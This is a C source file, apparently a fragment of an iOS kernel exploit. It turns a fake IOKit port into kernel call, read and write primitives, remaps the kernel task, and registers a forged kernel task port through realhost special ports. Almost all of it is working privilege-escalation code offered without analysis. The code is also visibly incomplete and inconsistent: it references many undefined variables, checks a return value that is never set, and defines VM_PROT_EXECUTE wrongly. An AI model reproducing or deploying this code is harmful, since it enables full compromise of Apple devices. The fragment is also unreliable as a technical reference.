#include <stdint.h>
#include <stdarg.h>

typedef uint64_t kptr_t;
typedef int kern_return_t;
typedef uint64_t size_t;
typedef uint32_t mach_port_t;

typedef volatile struct {
    uint32_t ip_bits;
    uint32_t ip_references;
    struct {
        kptr_t data;
        uint32_t type;
#ifdef __LP64__
        uint32_t pad; 
#endif
    } ip_lock; // spinlock
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    kptr_t next;
                    kptr_t prev;
                } waitq_queue;
            } waitq;
            kptr_t messages;
            uint32_t seqno;
            uint32_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
#ifdef __LP64__
            uint32_t pad;
#endif
        } port;
        kptr_t klist;
    } ip_messages;
    kptr_t ip_receiver;
    kptr_t ip_kobject;
    kptr_t ip_nsrequest;
    kptr_t ip_pdrequest;
    kptr_t ip_requests;
    kptr_t ip_premsg;
    uint64_t ip_context;
    uint32_t ip_flags;
    uint32_t ip_mscount;
    uint32_t ip_srights;
    uint32_t ip_sorights;
} kport_t;

#define LOG(str, args...) do { } while(0)
#define KERN_INVALID_ARGUMENT 2
#define KERN_FAILURE 1
#define KERN_SUCCESS 0


#define IO_BITS_ACTIVE 0x80000000
#define IOT_PORT 0
#define IKOT_NONE 0
#define IKOT_TASK 2
#define IKOT_IOKIT_CONNECT 29

#define pgsize 0x4000


#define VM_PROT_READ 0x1
#define VM_PROT_WRITE 0x2
#define VM_PROT_EXECUTE 0x3

void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t kslide,uint64_t the_one,void *(*write) (int fd,void * buf,uint64_t size)) {
	kern_return_t ret;
	kern_return_t (^kcall)(uint64_t, int, ...);
	uint64_t (^zonemap_fix_addr)(uint64_t);

	void (^kreadbuf)(uint64_t, void *, size_t) ;
	void (^kwritebuf)(uint64_t, void *, size_t);

	uint32_t (^kread32)(uint64_t);
	uint64_t (^kread64)(uint64_t);

	void (^kwrite32)(uint64_t, uint32_t);
	void (^kwrite64)(uint64_t, uint64_t);
	kcall = ^(uint64_t addr, int n_args, ...)
    {
        if (n_args > 7)
        {
            LOG("no more than 7 args you cheeky fuck");
            return KERN_INVALID_ARGUMENT;
        }

        va_list ap;
        va_start(ap, n_args);

        uint64_t args[7] = { 0 };
        for (int i = 0; i < n_args; i++)
        {
            args[i] = va_arg(ap, uint64_t);
        }

        // first arg must always have a value
        if (n_args == 0 ||
            args[0] == 0x0)
        {
            args[0] = 0x1;
        }

        *(uint64_t *)(fake_client + 0x40) = args[0];
        *(uint64_t *)(fake_client + 0x48) = addr + kslide;

        if (ret != KERN_SUCCESS)
        {
            LOG("failed to write to kdata buffer! ret: %x", ret);
            return 0x0;
        }

        return IOConnectTrap6(the_one, 0, args[1], args[2], args[3], args[4], args[5], args[6]);
    };

    /*  once we have an execution primitive we can use copyin/copyout funcs to freely read/write kernel mem  */

    kreadbuf = ^(uint64_t addr, void *buf, size_t len)
    {
        kcall(offsets.funcs.copyout, 3, addr, buf, len);
    };

    kread32 = ^(uint64_t addr)
    {
        uint32_t val = 0;
        kreadbuf(addr, &val, sizeof(val));
        return val;
    };
	
	kread64 = ^(uint64_t addr)
    {
        uint64_t val = 0;
        kreadbuf(addr, &val, sizeof(val));
        return val;
    };

    kwritebuf = ^(uint64_t addr, void *buf, size_t len)
    {
        kcall(offsets.funcs.copyin, 3, buf, addr, len);
    };

    kwrite32 = ^(uint64_t addr, uint32_t val)
    {
        kwritebuf(addr, &val, sizeof(val));
    };

    kwrite64 = ^(uint64_t addr, uint64_t val)
    {
        kwritebuf(addr, &val, sizeof(val));
    };

    uint64_t zone_map_addr = kread64(offsets.data.zone_map + kslide);
    if (zone_map_addr == 0x0)
    {
        LOG("failed to get zone map addr");
        ret = KERN_FAILURE;
        goto out;
    }

    LOG("[+] got zone map addr: %llx", zone_map_addr);

    typedef volatile struct
    {
        kptr_t prev;
        kptr_t next;
        kptr_t start;
        kptr_t end;
    } kmap_hdr_t;

    kmap_hdr_t zm_hdr = { 0 };

    // lck_rw_t = uintptr_t opaque[2] = unsigned long opaque[2]
    kreadbuf(zone_map_addr + (sizeof(unsigned long) * 2), (void *)&zm_hdr, sizeof(zm_hdr));

    LOG("zmap start: %llx", zm_hdr.start);
    LOG("zmap end: %llx", zm_hdr.end);

    uint64_t zm_size = zm_hdr.end - zm_hdr.start;
    LOG("zmap size: %llx", zm_size);

    if (zm_size > 0x100000000)
    {
        LOG("zonemap too large :/");
        ret = KERN_FAILURE;
        goto out;
    }
	uint64_t kern_task_addr = kread64(offsets.data.kernel_task + kslide);
    if (kern_task_addr == 0x0)
    {
        LOG("failed to read kern_task_addr!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("[+] kern_task_addr: %llx", kern_task_addr);

    uint64_t kern_proc = zonemap_fix_addr(kcall(offsets.funcs.get_bsdtask_info, 1, kern_task_addr));
    if (kern_proc == 0x0)
    {
        LOG("failed to read kern_proc!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("[+] got kernproc: %llx", kern_proc);;

    uint64_t curr_task = zonemap_fix_addr(kcall(offsets.funcs.current_task, 0));
    if (curr_task == 0x0)
    {
        LOG("failed to get curr_task!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("[+] curr task: %llx", curr_task);

    // get kernel map
    uint64_t kernel_vm_map = kread64(kern_task_addr + 0x20);
    if (kernel_vm_map == 0x0)
    {
        LOG("failed to read kernel_vm_map!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("got kernel vm map: %llx", kernel_vm_map);

    uint64_t ipc_space_kernel = kread64(ip_kobject_client_port_addr + offsetof(kport_t, ip_receiver));;
    if (ipc_space_kernel == 0x0)
    {
        LOG("failed to read ipc_space_kernel!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("ipc_space_kernel: %llx", ipc_space_kernel);

    uint64_t ptrs[2] = { 0 };
    ptrs[0] = zonemap_fix_addr(kcall(offsets.funcs.ipc_port_alloc_special, 1, ipc_space_kernel));
    ptrs[1] = zonemap_fix_addr(kcall(offsets.funcs.ipc_port_alloc_special, 1, ipc_space_kernel));
    LOG("zm_port addr: %llx", ptrs[0]);
    LOG("km_port addr: %llx", ptrs[1]);

    size_t ktask_size = offsets.struct_offsets.sizeof_task;

    mach_msg_data_buffer_t *zm_task_buf_msg = (mach_msg_data_buffer_t *)malloc(ktask_size);
    bzero(zm_task_buf_msg, ktask_size);

    zm_task_buf_msg->verification_key = 0x4242424243434343;

	ktask_t *km_task_buf = (ktask_t *)(&km_task_buf_msg->data[0]);
    km_task_buf->a.map = kernel_vm_map;

    // send both messages into kernel and grab the buffer addresses
    uint64_t zm_task_buf_addr = send_buffer_to_kernel_and_find(offsets, kread64, our_task_addr, zm_task_buf_msg, ktask_size);
    if (zm_task_buf_addr == 0x0)
    {
        LOG("failed to get zm_task_buf_addr!");
        goto out;
    }

    LOG("zm_task_buf_addr: %llx", zm_task_buf_addr);

    uint64_t km_task_buf_addr = send_buffer_to_kernel_and_find(offsets, kread64, our_task_addr, km_task_buf_msg, ktask_size);
    if (km_task_buf_addr == 0x0)
    {
        LOG("failed to get km_task_buf_addr!");
        goto out;
    }

    LOG("km_task_buf_addr: %llx", km_task_buf_addr);

    kcall(offsets.funcs.ipc_kobject_set, 3, ptrs[0], (uint64_t)zm_task_buf, IKOT_TASK);
    kcall(offsets.funcs.ipc_kobject_set, 3, ptrs[1], (uint64_t)km_task_buf, IKOT_TASK);

    kwrite64(curr_task + offsets.struct_offsets.itk_registered + 0x0, ptrs[0]);
    kwrite64(curr_task + offsets.struct_offsets.itk_registered + 0x8, ptrs[1]);

    usleep(50000);

    ret = mach_ports_lookup(mach_task_self(), &maps, &maps_num);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to lookup mach ports: %x (%s)", ret, mach_error_string(ret));
        ret = KERN_FAILURE;
        goto out;
    }

    LOG("zone_map port: %x", maps[0]);
    LOG("kernel_map port: %x", maps[1]);

    if (!MACH_PORT_VALID(maps[0]) ||
        !MACH_PORT_VALID(maps[1]))
    {
        LOG("invalid zone/kernel map ports");
        ret = KERN_FAILURE;
        goto out;
    }

    ptrs[0] = ptrs[1] = 0x0;

    kwrite64(curr_task + offsets.struct_offsets.itk_registered + 0x0, 0x0);
    kwrite64(curr_task + offsets.struct_offsets.itk_registered + 0x8, 0x0);

    LOG("kern_task_addr: %llx", kern_task_addr);

	mach_vm_address_t remap_addr = 0x0;
    vm_prot_t cur = 0x0, max = 0x0;
    ret = mach_vm_remap(maps[1], &remap_addr, offsets.struct_offsets.sizeof_task, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, maps[0], kern_task_addr, false, &cur, &max, VM_INHERIT_NONE);
    if (ret != KERN_SUCCESS)
    {
        LOG("mach_vm_remap failed: %x (%s)", ret, mach_error_string(ret));
        ret = KERN_FAILURE;
        goto out;
    }

    LOG("[+] remap addr: %llx", remap_addr);

    usleep(500000);

    mach_port_destroy(mach_task_self(), maps[0]);
    mach_port_destroy(mach_task_self(), maps[1]);

    // remap must cover the entire struct and be page aligned 
    uint64_t remap_start = remap_addr & ~(pgsize - 1);
    uint64_t remap_end = (remap_addr + offsets.struct_offsets.sizeof_task + pgsize) & ~(pgsize - 1);

    // kern_return_t vm_map_wire_external(vm_map_t map, vm_map_offset_t start, vm_map_offset_t end, vm_prot_t caller_prot, boolean_t user_wire)
    ret = kcall(offsets.funcs.vm_map_wire_external, 5, kernel_vm_map, remap_start, remap_end, VM_PROT_READ | VM_PROT_WRITE, false);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to kcall vm_map_wire_external: %x (%s)", ret, mach_error_string(ret));
        ret = KERN_FAILURE;
        goto out;
    }

    uint64_t new_port = zonemap_fix_addr(kcall(offsets.funcs.ipc_port_alloc_special, 1, ipc_space_kernel));
    LOG("new_port: %llx", new_port);

    usleep(500000);

    kcall(offsets.funcs.ipc_kobject_set, 3, new_port, remap_addr, IKOT_TASK);
    kcall(offsets.funcs.ipc_port_make_send, 1, new_port);

    uint64_t realhost = offsets.data.realhost + kslide;
    LOG("[!] realhost: %llx", realhost);

// realhost->special[4]
    kwrite64(realhost + 0x10 + (sizeof(uint64_t) * 4), new_port);
    LOG("registered realhost->special[4]");

    // zero out old ports before overwriting
    for (int i = 0; i < 3; i++)
    {
        kwrite64(curr_task + offsets.struct_offsets.itk_registered + (i * 0x8), 0x0);
    }

    kwrite64(curr_task + offsets.struct_offsets.itk_registered, new_port);
    LOG("wrote new port: %llx", new_port);

    ret = mach_ports_lookup(mach_task_self(), &maps, &maps_num);

//    kwrite64(curr_task + ITK_REGISTERED_OFFSET, 0x0);

    if (ret != KERN_SUCCESS)
    {
        LOG("failed to lookup mach ports: %x (%s)", ret, mach_error_string(ret));
        ret = KERN_FAILURE;
        goto out;
    }

    mach_port_t kernel_task = maps[0];
    if (!MACH_PORT_VALID(kernel_task))
    {
        LOG("kernel_task is invalid");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("got kernel task port: %x", kernel_task);

out:
	fakeport->ip_bits = 0x0;
    fakeport->ip_kobject = 0x0;
	mach_port_deallocate(mach_task_self(), the_one);
}
